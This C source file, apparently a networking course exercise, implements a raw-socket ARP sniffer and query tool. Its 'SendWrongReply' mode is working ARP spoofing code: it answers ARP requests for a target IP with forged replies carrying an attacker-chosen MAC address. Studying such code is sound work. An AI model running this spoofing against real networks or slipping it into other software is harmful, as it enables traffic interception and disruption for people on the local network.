#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>		// for socket(), recvfrom()

#include <sys/ioctl.h>		// for SIOCGIFFLAGS, SIOCSIFFLAGS
#include <signal.h>			// for signal()
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <string.h>
#include <arpa/inet.h>
#define ErrorComment			-1
#define ShowCommentFormat 		0
#define ShowAllArpPacket 		1
#define ShowWithFilter 			2
#define SendBroadcastToQuery 	3
#define SendWrongReply 			4

#define DEVICE_NAME "eth0"
#define DIE(x)   perror(x),exit(errno)
#define MTU	1536		// Maximum Transfer Unit (bytes)


struct sockaddr_ll sa;
struct ifreq req;		// structure for 'ioctl' requests
struct in_addr myip;

int pkt_num;
int sockfd_recv = 0, sockfd_send = 0;
int isValidMacAddress(char* Mac);
int isValidIpAddress(char* Ip);
int FindCommentType(int argc, char *argv[ ]);
/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */
void MyCleanup( void );

void MyHandler( int signo ) ;


int main(int argc, char *argv[ ])
{

	int i=0;
	
	if(geteuid() != 0)
	{
	// Tell user to run app as root, then exit.
		printf("ERROR::You must run as Root to use this root\n");
		return 0;
	}
	sockfd_recv = 0;
	sockfd_send = 0;

	
	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) ) <0)
	{
		perror("open recv socket error");
                exit(1);
	}

	/*
	 * Use recvfrom function to get packet.
	 * recvfrom( ... )
	 */
	// Open a send socket in data-link layer.
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}
	
	/*
	 * Use ioctl function binds the send socket and the Network Interface Card.
`	 * ioctl( ... )
	 */


	struct ifconf ifconf;
	struct ifreq* ifreq;
	unsigned char buf[512]; 
	ifconf.ifc_len = 512; 
	ifconf.ifc_buf = buf; 
	ioctl(sockfd_send, SIOCGIFCONF, &ifconf);
	ifreq = (struct ifreq*)buf;

	for (i=(ifconf.ifc_len/sizeof (struct ifreq)); i>0; i--) {  
		
			printf("name = [%s]\n" , ifreq->ifr_name);  
			if(strcmp("lo",ifreq->ifr_name) != 0){

				strcpy(req.ifr_name,ifreq->ifr_name);
				printf("A req.ifr_name = %s\n",req.ifr_name);
			}

			printf("local addr = [%s]\n" ,inet_ntoa(((struct sockaddr_in*)&(ifreq->ifr_addr))->sin_addr)); 
			ifreq++; // 
			
	} 
	printf("req.ifr_name = %s\n",req.ifr_name);
	//strncpy(req.ifr_name,"eth0",IFNAMSIZ);
	/*retrieve ethernet interface index*/

	//When call ioctl will change req , so need to store
	if (ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1) {
		perror("ioctl: SIOCGIFINDEX");
		exit(1);
	}
	int ifindex = req.ifr_ifindex;
	if(ioctl(sockfd_send, SIOCGIFHWADDR,&req) < 0){
		perror( "ioctl: get HWADDR" ); exit(1);
	}
	unsigned char MyMac[6]={};
	memcpy(MyMac, req.ifr_hwaddr.sa_data,sizeof(req.ifr_hwaddr.sa_data));
	if(	ioctl(sockfd_send,SIOCGIFADDR,&req)<0) {  
       perror( "ioctl: get Address" ); exit(1);
     }
	
	if ( ioctl( sockfd_send, SIOCGIFFLAGS, &req ) < 0 ){ 
		perror( "ioctl: get ifflags" ); exit(1); }
	// enable 'promiscuous' mode
	req.ifr_flags|=IFF_PROMISC;	
	if ( ioctl( sockfd_send, SIOCSIFFLAGS, &req ) < 0 ){
		perror( "ioctl: set ifflags" ); exit(1); }



	if ( ioctl( sockfd_recv, SIOCGIFFLAGS, &req ) < 0 ){ 
		perror( "ioctl: get ifflags" ); exit(1); }
	// enable 'promiscuous' mode
	req.ifr_flags|=IFF_PROMISC;	
	if ( ioctl( sockfd_recv, SIOCSIFFLAGS, &req ) < 0 ){
		perror( "ioctl: set ifflags" ); exit(1); }



	// make sure 'promiscuous mode' will get disabled upon termination
	//atexit :change exit
	atexit( MyCleanup );
	signal( SIGINT, MyHandler );

	// Fill the parameters of the sa.

	printf("MyMAC is: %02X:%02X:%02X:%02X:%02X:%02X\n",*(MyMac),*(MyMac+1),*(MyMac+2),*(MyMac+3),*(MyMac+4),*(MyMac+5));
	
	/**Set Target IP**/
	in_addr_t targetIP =inet_addr(argv[2]);



	struct sockaddr_ll from;
	socklen_t len =  sizeof(from);
	int n=0,t=0;
	char	buffer[ MTU ];
	
printf("------Go Arp----------\n");
	int Type = FindCommentType(argc,argv);
	if(Type == ErrorComment){
		//Had print Error at FindCommentType , do nothing
	}else if(Type == ShowAllArpPacket){
		//  comment "-l -a" , 

		while(1){
			struct arp_packet ArpPacket;
			memset((void*)&ArpPacket, 0, sizeof(ArpPacket));
			int length = recvfrom(sockfd_recv, (void *)&ArpPacket,sizeof(ArpPacket), 0, NULL, NULL);
			if (length == -1)
			{
				perror("recvfrom():");
				exit(1);
			}
			
			if( ArpPacket.eth_hdr.ether_type  ==htons(0x0806) ){
				//EtherType 0x0806 :: Address Resolution Protocol (ARP)
				//ether_type is u_short


				if(ArpPacket.arp.arp_op== htons(0x0001)){
					//arp operation 1 is request , 2 is reply , 3/4 Rarp request/reply
					
				
					//printf("Hard TYPE : %x PROTO TYPE : %x \n",ntohs(ArpPacket.arp.arp_hrd),ntohs(ArpPacket.arp.arp_pro));
					//printf("Hard leng : %x PROTO leng : %x \n",ArpPacket.arp.arp_hln,ArpPacket.arp.arp_pln);
					printf("OPERATION : %x \n", ntohs(ArpPacket.arp.arp_op));
					
					printf("Who has IP address: %02d:%02d:%02d:%02d",
					ArpPacket.arp.arp_tpa[0],
					ArpPacket.arp.arp_tpa[1],
					ArpPacket.arp.arp_tpa[2],
					ArpPacket.arp.arp_tpa[3]
					);

					printf("\tTeller IP address: %02d:%02d:%02d:%02d\n",
					ArpPacket.arp.arp_spa[0],
					ArpPacket.arp.arp_spa[1],
					ArpPacket.arp.arp_spa[2],
					ArpPacket.arp.arp_spa[3]
					);
					
				}
				if(ArpPacket.arp.arp_op== htons(0x0002)){
					//arp operation 1 is request , 2 is reply , 3/4 Rarp request/reply
					
				
					//printf("Hard TYPE : %x PROTO TYPE : %x \n",ntohs(ArpPacket.arp.arp_hrd),ntohs(ArpPacket.arp.arp_pro));
					//printf("Hard leng : %x PROTO leng : %x \n",ArpPacket.arp.arp_hln,ArpPacket.arp.arp_pln);
					printf("OPERATION : %x \n", ntohs(ArpPacket.arp.arp_op));
					
					printf("Mac address of Target IP : %02d:%02d:%02d:%02d",
					ArpPacket.arp.arp_spa[0],
					ArpPacket.arp.arp_spa[1],
					ArpPacket.arp.arp_spa[2],
					ArpPacket.arp.arp_spa[3]
					);

					printf(" is  address: %02X:%02X:%02X:%02X:%02X:%02X\n",
					ArpPacket.arp.arp_sha[0],
					ArpPacket.arp.arp_sha[1],
					ArpPacket.arp.arp_sha[2],
					ArpPacket.arp.arp_sha[3],
					ArpPacket.arp.arp_sha[4],
					ArpPacket.arp.arp_sha[5]
					);
					
					
				}

			}

		}

	}else if(Type == ShowWithFilter){
		//  comment "-l <ip>" 

		while(1){
			struct arp_packet ArpPacket;
			memset((void*)&ArpPacket, 0, sizeof(ArpPacket));
			int length = recvfrom(sockfd_recv, (void *)&ArpPacket,sizeof(ArpPacket), 0, NULL, NULL);
			if (length == -1)
			{
				perror("recvfrom():");
				exit(1);
			}
			
			if( ArpPacket.eth_hdr.ether_type  ==htons(0x0806) ){
				//EtherType 0x0806 :: Address Resolution Protocol (ARP)
				//ether_type is u_short

				

				if(ArpPacket.arp.arp_op== htons(0x0001)){
					//arp operation 1 is request , 2 is reply , 3/4 Rarp request/reply
					if( memcmp(ArpPacket.arp.arp_tpa ,&targetIP,sizeof(ArpPacket.arp.arp_tpa)) !=0){
						continue;
						
					}	
				
					//printf("Hard TYPE : %x PROTO TYPE : %x \n",ntohs(ArpPacket.arp.arp_hrd),ntohs(ArpPacket.arp.arp_pro));
					//printf("Hard leng : %x PROTO leng : %x \n",ArpPacket.arp.arp_hln,ArpPacket.arp.arp_pln);
					printf("OPERATION : %x \n", ntohs(ArpPacket.arp.arp_op));
					
					printf("Who has Target IP address: %02d:%02d:%02d:%02d",
					ArpPacket.arp.arp_tpa[0],
					ArpPacket.arp.arp_tpa[1],
					ArpPacket.arp.arp_tpa[2],
					ArpPacket.arp.arp_tpa[3]
					);

					printf("\tTeller Sender IP address: %02d:%02d:%02d:%02d\n",
					ArpPacket.arp.arp_spa[0],
					ArpPacket.arp.arp_spa[1],
					ArpPacket.arp.arp_spa[2],
					ArpPacket.arp.arp_spa[3]
					);
					
				}
				if(ArpPacket.arp.arp_op== htons(0x0002)){
					//arp operation 1 is request , 2 is reply , 3/4 Rarp request/reply
					
					if( memcmp(ArpPacket.arp.arp_spa ,&targetIP,sizeof(ArpPacket.arp.arp_tpa)) !=0){
						continue;
						
					}
					//printf("Hard TYPE : %x PROTO TYPE : %x \n",ntohs(ArpPacket.arp.arp_hrd),ntohs(ArpPacket.arp.arp_pro));
					//printf("Hard leng : %x PROTO leng : %x \n",ArpPacket.arp.arp_hln,ArpPacket.arp.arp_pln);
					printf("OPERATION : %x \n", ntohs(ArpPacket.arp.arp_op));
					
					printf("Mac address of Target IP : %02d:%02d:%02d:%02d",
					ArpPacket.arp.arp_spa[0],
					ArpPacket.arp.arp_spa[1],
					ArpPacket.arp.arp_spa[2],
					ArpPacket.arp.arp_spa[3]
					);

					printf(" is  address: %02X:%02X:%02X:%02X:%02X:%02X\n",
					ArpPacket.arp.arp_sha[0],
					ArpPacket.arp.arp_sha[1],
					ArpPacket.arp.arp_sha[2],
					ArpPacket.arp.arp_sha[3],
					ArpPacket.arp.arp_sha[4],
					ArpPacket.arp.arp_sha[5]
					);
					
				
					
				}

			}

		}


	}else if(Type == SendBroadcastToQuery){
		
		struct arp_packet ArpPacket;
		
		memset((void*)&ArpPacket, 0, sizeof(ArpPacket));
		const unsigned char ether_broadcast_addr[]={0xff,0xff,0xff,0xff,0xff,0xff};

		/**Set Ether header Destination ff:ff:ff:ff:ff:ff**/
		//memset((void*)&ArpPacket.eth_hdr.ether_dhost, 0xff, sizeof(ArpPacket.eth_hdr.ether_dhost));
		memcpy((void*)&ArpPacket.eth_hdr.ether_dhost,ether_broadcast_addr,sizeof(ArpPacket.eth_hdr.ether_shost));
		/**Set Ether header Source MyMac**/
		memcpy(ArpPacket.eth_hdr.ether_shost,MyMac,sizeof(ArpPacket.eth_hdr.ether_shost));
		/**Set Ether header Frame Type**/
		ArpPacket.eth_hdr.ether_type = htons(0x0806);



		//http://www.networksorcery.com/enp/protocol/arp.htm#Hardware type
		ArpPacket.arp.arp_hrd = htons(0x0001);				//Ether type 0x0001 for 802.3 Frames ,u_short
		ArpPacket.arp.arp_pro = htons (0x0800);
		/**u_short ,Protocol type. 16 bits.
		Value	Description
		0x800	IP.
		**/

		ArpPacket.arp.arp_hln = ETH_ALEN;			// 6 for eth-mac addr len,u_char(1 byte)
		ArpPacket.arp.arp_pln = 4;				//4 for IPv4 addr
		ArpPacket.arp.arp_op = htons(0x0001);			//0x0001 for ARP Request

		/**Set ARP request/reply sender Ethernet addr**/
		memcpy(ArpPacket.arp.arp_sha,MyMac,sizeof(ArpPacket.arp.arp_sha));
		/**Set ARP request/reply sender IP addr , arp_spa u_long**/
	    printf("My IP is %d.%d.%d.%d\n",      //把ip地址提取出来
       (unsigned char)req.ifr_addr.sa_data[2],
       (unsigned char)req.ifr_addr.sa_data[3],
       (unsigned char)req.ifr_addr.sa_data[4],
       (unsigned char)req.ifr_addr.sa_data[5]);
	    memcpy(ArpPacket.arp.arp_spa,&((struct sockaddr_in *)&req.ifr_addr)->sin_addr,sizeof(ArpPacket.arp.arp_spa));
		//unsigned char tempip[4];
		//ArpPacket.arp.arp_spa = ntohl() ((struct sockaddr_in *)&req.ifr_addr)->sin_addr.s_addr );
		
		
		/**Set ARP request/reply Target hardware address , u_char[6]**/
		//Do nothing

		/**Set ARP request/reply Target protocol address , u_long**/
		in_addr_t targetIP =inet_addr(argv[2]);
	 	memcpy(ArpPacket.arp.arp_tpa, &targetIP,sizeof(ArpPacket.arp.arp_tpa));
		
		
		struct sockaddr_ll to;
		memset((void*)&to, 0, sizeof(to));
		//strcpy(to.sa_data,"eth0");
		//Send to the eth0 interface
		
		to.sll_family=AF_PACKET;
		to.sll_ifindex = ifindex;
		
		//printf(" ifindex = %d\n",ifindex);
		//to.sll_ifindex=req.ifr_ifindex;
		to.sll_halen=ETHER_ADDR_LEN;
		to.sll_protocol=htons(ETH_P_ARP);
		memcpy(to.sll_addr,ether_broadcast_addr,ETHER_ADDR_LEN);
		
		int send = sendto(sockfd_send, (void *)&ArpPacket, sizeof(ArpPacket), 0, (struct sockaddr*)&to, sizeof(to));
		if (send == -1){
			perror("sendto():");
			exit(1);
		}

		/**Had Sending Query**/

		//printf("C\n");
		while(1){
			
			struct arp_packet RecArpPacket;
			memset((void*)&RecArpPacket, 0, sizeof(RecArpPacket));
			int length = recvfrom(sockfd_recv, (void *)&RecArpPacket,sizeof(RecArpPacket), 0, NULL, NULL);
			if (length == -1)
			{
				perror("recvfrom():");
				exit(1);
			}
			if(htons(  RecArpPacket.eth_hdr.ether_type ) == 0x806){
				//EtherType 0x0806 :: Address Resolution Protocol (ARP)
				//ether_type is u_short

				if(htons(RecArpPacket.arp.arp_op) != 0x0002){
					//arp operation 1 is request , 2 is reply , 3/4 Rarp request/reply
					continue;
				}
				//printf("Hard TYPE : %X PROTO TYPE : %X \n",ntohs(RecArpPacket.arp.arp_hrd),ntohs(RecArpPacket.arp.arp_pro));
				//printf("Hard leng : %x PROTO leng : %x \n",RecArpPacket.arp.arp_hln,RecArpPacket.arp.arp_pln);
				printf("OPERATION : %X \n", ntohs(RecArpPacket.arp.arp_op));
				
				printf("Mac address of Target IP : %02d:%02d:%02d:%02d",
				RecArpPacket.arp.arp_spa[0],
				RecArpPacket.arp.arp_spa[1],
				RecArpPacket.arp.arp_spa[2],
				RecArpPacket.arp.arp_spa[3]
				);

				printf(" is  address: %02X:%02X:%02X:%02X:%02X:%02X\n",
				RecArpPacket.arp.arp_sha[0],
				RecArpPacket.arp.arp_sha[1],
				RecArpPacket.arp.arp_sha[2],
				RecArpPacket.arp.arp_sha[3],
				RecArpPacket.arp.arp_sha[4],
				RecArpPacket.arp.arp_sha[5]
				);
				
				
			
				if( memcmp(RecArpPacket.arp.arp_spa ,&targetIP,sizeof(RecArpPacket.arp.arp_tpa)) ==0){
					
						return 0;
				}

				

			}
		}
		
	}else if(Type == SendWrongReply){
		// When get want change request , send fake packet to it
		const unsigned char ether_broadcast_addr[]={0xff,0xff,0xff,0xff,0xff,0xff};
		while(1){
			struct arp_packet RecArpPacket;
			struct sockaddr_ll sa;
			

			memset((void*)&RecArpPacket, 0, sizeof(RecArpPacket));
			int length = recvfrom(sockfd_recv, (void *)&RecArpPacket,sizeof(RecArpPacket), 0, NULL, NULL);
			if (length == -1)
			{
				perror("recvfrom():");
				exit(1);
			}
			if(htons(  RecArpPacket.eth_hdr.ether_type ) == 0x806){
				//EtherType 0x0806 :: Address Resolution Protocol (ARP)
				//ether_type is u_short

				if(htons(RecArpPacket.arp.arp_op) != 0x0001){
					//arp operation 1 is request , 2 is reply , 3/4 Rarp request/reply
					continue;
				}
				printf("Who has IP address: %02d:%02d:%02d:%02d",
				RecArpPacket.arp.arp_tpa[0],
				RecArpPacket.arp.arp_tpa[1],
				RecArpPacket.arp.arp_tpa[2],
				RecArpPacket.arp.arp_tpa[3]
				);

				printf("\tTeller IP address: %02d:%02d:%02d:%02d\n",
				RecArpPacket.arp.arp_spa[0],
				RecArpPacket.arp.arp_spa[1],
				RecArpPacket.arp.arp_spa[2],
				RecArpPacket.arp.arp_spa[3]
				);
				
				//In SendWrongReply  targetIP is attacked  , send fake to it
				if( memcmp(RecArpPacket.arp.arp_tpa ,&targetIP,sizeof(RecArpPacket.arp.arp_tpa)) ==0){
					printf("Send fake Mac\n");
					

					unsigned int iMac[6];
					unsigned char fakemac[6];
					int i;
					sscanf(argv[1], "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]);
					for(i=0;i<6;i++)
					    fakemac[i] = (unsigned char)iMac[i];



				
					struct arp_packet SendArpPacket;
					memset((void*)&sa, 0, sizeof(sa));
					memset((void*)&SendArpPacket, 0, sizeof(SendArpPacket));

					memcpy(&SendArpPacket,&RecArpPacket,sizeof(SendArpPacket));

					/**Set Send destination , source**/
					memcpy(&SendArpPacket.eth_hdr.ether_dhost,&RecArpPacket.eth_hdr.ether_shost,sizeof(SendArpPacket.eth_hdr.ether_dhost));
					//In here should Mymac?
					memcpy(&SendArpPacket.eth_hdr.ether_shost,MyMac,sizeof(SendArpPacket.eth_hdr.ether_shost));
		
					SendArpPacket.arp.arp_op = htons(0x0002);			//0x0002 for ARP Request

					/**Set ARP request/reply sender Ethernet addr+protocol address**/
					memcpy(SendArpPacket.arp.arp_sha,fakemac,sizeof(SendArpPacket.arp.arp_sha));
					//Set fake sender
					in_addr_t targetIP =inet_addr(argv[2]);
				    memcpy(SendArpPacket.arp.arp_spa,&targetIP,sizeof(SendArpPacket.arp.arp_spa));
		

				    /**Set ARP request/reply Target hardware address , u_char[6]**/
					memcpy(SendArpPacket.arp.arp_tha,RecArpPacket.arp.arp_sha,sizeof(SendArpPacket.arp.arp_tha));
					/**Set ARP request/reply Target protocol address , u_long**/
					memcpy(SendArpPacket.arp.arp_tpa, RecArpPacket.arp.arp_spa,sizeof(SendArpPacket.arp.arp_tpa));




					/*prepare sockaddr_ll*/
					//struct sockaddr_ll  http://blog.csdn.net/cyx1743/article/details/6687771
					sa.sll_family 	= AF_PACKET;
					sa.sll_protocol = htons(ETH_P_ARP );

					sa.sll_ifindex 	= ifindex;//?


					sa.sll_hatype 	= ARPHRD_ETHER;

					//在混雜(promiscuous)模式下的設備驅動器發向其他主機的分組用的PACKET_OTHERHOST
					sa.sll_pkttype 	= PACKET_OTHERHOST;
					
					sa.sll_halen	= ETH_ALEN;


					memcpy(&sa.sll_addr,ether_broadcast_addr,sizeof(ether_broadcast_addr));
					
					sa.sll_addr[6] 	= 0x00;
					sa.sll_addr[7] 	= 0x00;

					//Send to some one
					int send = sendto(sockfd_send, (void *)&SendArpPacket, sizeof(SendArpPacket), 0, (struct sockaddr*)&sa, sizeof(sa));
					if (send == -1)
					{
						perror("sendto():");
						exit(1);
					}


				}
			}
		}




	}else{}
	/*
	 * use sendto function with sa variable to send your packet out
	 * sendto( ... )
	 */


	
	

	 


/**若在打開之後,沒有在程式結束前關閉. 它就會一直打開哦 . 所以記得要關閉它.**/
	




	return 0;
}
/**To show All arp packet**/

/*
n = recvfrom( sockfd_recv, buffer, MTU, 0, (struct sockaddr*) &from, &len );
printf ("recvfrom -> %d , Familly, proto %d, 0x%x, Interface Number %d, Packet Type %d, Header type %d 0x%x \n",
n, from.sll_family, ntohs (from.sll_protocol),
from.sll_ifindex, from.sll_pkttype, from.sll_hatype, from.sll_hatype);


t++;*/
int FindCommentType(int argc, char *argv[ ]){
	switch(argc){

		case 2:
			if(strcmp(argv[argc-1],"-h")==0){
				printf("Format\n./arp -l -a\n./arp -l <filter_ip_address>\n./arp -q <query_ip_address>\n./arp <fake_mac_address> <target_ip_address>\n");
				return ShowCommentFormat;
			}else{
				printf("ERROR Pattern\n");
				return ErrorComment;
			}
			break;
		case 3:

			if(strcmp(argv[1],"-l") ==0 ){
				if(strcmp(argv[2],"-a") ==0 ){
					return ShowAllArpPacket;
				}else{
					if( isValidIpAddress(argv[2]) <= 0) {
				        printf("ERROR Pattern Invalid IP address\n");
				        return ErrorComment;
				    }
				    return ShowWithFilter;
				}
			}else if(strcmp(argv[1],"-q") ==0 ){
				return SendBroadcastToQuery;

			}else{
				if(isValidMacAddress(argv[1]) < 0){
						printf("ERROR Pattern mac address\n");
				        return ErrorComment;
				}
				return SendWrongReply;

			}
			break;
		default:
			printf("ERROR Pattern\n");
			return ErrorComment;
			break;
	}
	return ErrorComment;
}
int isValidMacAddress(char* Mac){
	//printf("strlen(Mac) = %d\n",strlen(Mac));
	if(strlen(Mac)!=17){
		return -1;
	}
	int i=0;
	for(;i<17;i++){
		if( i%3!=2 &&  ((Mac[i]>='0' && Mac[i]<='9') || (Mac[i]>='a' && Mac[i]<='f'))  ){
			continue;
		}else if(i%3==2 && Mac[i]==':'){
			continue;

		}else{
			printf("Mac[%d]=%c\n",i,Mac[i]);
			return -1;
		}

	}
	return 1;

}
int isValidIpAddress(char* Ip){
	long addr;
	//AF_INET is IPv4 Internet protocols 
	if(inet_pton(AF_INET,Ip, (void *)&addr) <= 0) {
        return -1;
    }

	return 1;
}

void MyCleanup( void )
{
	//Turn off the interface's 'promiscuous' mode
	req.ifr_flags &= ~IFF_PROMISC;  
	if ( ioctl( sockfd_send, SIOCSIFFLAGS, &req ) < 0 )
		{ perror( "ioctl: set ifflags" ); exit(1); }
	if ( ioctl( sockfd_recv, SIOCSIFFLAGS, &req ) < 0 )
		{ perror( "ioctl: set ifflags" ); exit(1); }

	printf("------End Arp----------\n");
	fflush(stdout);
	//Clean buffer from malloc
}
void MyHandler( int signo ) 
{ 
	
	// This function executes when the user hits <CTRL-C>. 
	// It initiates program-termination, thus triggering
	// the 'cleanup' function we previously installed.
	exit(0); 
}

/**
Reference 
http://blog.roodo.com/thinkingmore/archives/554037.html
https://bytes.com/topic/c/answers/749224-arp-packet-network-program
int sock;
// 開一個接收所有走ip protocol 封包的完整封包
sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));

// 開一個接收所有走arp protocol 封包的完整封包
sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

// 開一個接收所有 protocol 封包的完整封包
sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_All));

// 在linux 下接收datalink 層的網路封包
sock = socket(PF_INET, SOCK_PACKET, htons(ETH+P_ALL));

**/




//struct sockaddr_ll {
//   unsigned short sll_family;   /* Always AF_PACKET */
//   unsigned short sll_protocol; /* Physical-layer protocol */
//   int            sll_ifindex;  /* Interface number */
//   unsigned short sll_hatype;   /* ARP hardware type */
//   unsigned char  sll_pkttype;  /* Packet type */
//   unsigned char  sll_halen;    /* Length of address */
//   unsigned char  sll_addr[8];  /* Physical-layer address */
//};
